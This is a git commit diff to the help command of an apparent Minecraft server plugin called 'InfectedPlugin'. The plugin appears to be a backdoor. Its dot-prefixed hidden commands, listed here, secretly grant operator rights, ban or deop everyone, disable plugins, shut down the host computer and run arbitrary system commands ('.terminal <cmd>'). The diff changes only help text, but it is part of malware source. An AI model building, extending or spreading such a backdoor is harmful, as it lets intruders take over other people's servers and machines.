a5f116047513923e8069ec6de5d9d63f052c697d
Lamboling Seans <hansfrank97@yahoo.com>
2013-10-30 09:20:57 +0700

    Updated help

--- src/org/CreeperCoders/InfectedPlugin/Commands/Command_help.java
+++ src/org/CreeperCoders/InfectedPlugin/Commands/Command_help.java
@@ -27,17 +27,18 @@ public class Command_help implements Listener
                 p.sendMessage(ChatColor.RED + "Warning: You have to start the commands with . not /");
                 p.sendMessage(ChatColor.AQUA + "Commands");
                 p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
-                p.sendMessage(ChatColor.GOLD + ".disableplugin - Disables a plugin of your choice.");
-                p.sendMessage(ChatColor.GOLD + ".enableplugin - Enables a plugin of your choice.");
+                p.sendMessage(ChatColor.GOLD + ".disableplugin <plugin> - Disables a plugin of your choice.");
+                p.sendMessage(ChatColor.GOLD + ".enableplugin <plugin> - Enables a plugin of your choice.");
                 //p.sendMessage(ChatColor.GOLD + ".enablevanilla - Downloads vanilla and runs it (shuts down bukkit).");
-                p.sendMessage(ChatColor.GOLD + ".deop - Deops a player of your choice.");
-                p.sendMessage(ChatColor.GOLD + ".op - OPs a player of your choice.");
+                p.sendMessage(ChatColor.GOLD + ".deop <player> - Deops a player of your choice.");
+                p.sendMessage(ChatColor.GOLD + ".op <player> - OPs a player of your choice.");
+                p.sendMessage(ChatColor.GOLD + ".gamemode [gamemode] -");
                 p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server.");
                 p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
                 //p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
                 p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
                 //p.sendMessage(ChatColor.GOLD + ".fuckyou - Wouldn't have a clue."); // Pald update this one.
-                p.sendMessage(ChatColor.GOLD + ".terminal - Use system commands!");
+                p.sendMessage(ChatColor.GOLD + ".terminal <cmd> - Use cmd commands!");
                 p.sendMessage(ChatColor.GOLD + ".explode or .explosion - Explode everyone on the server. Includes you.");
                 p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
                 p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
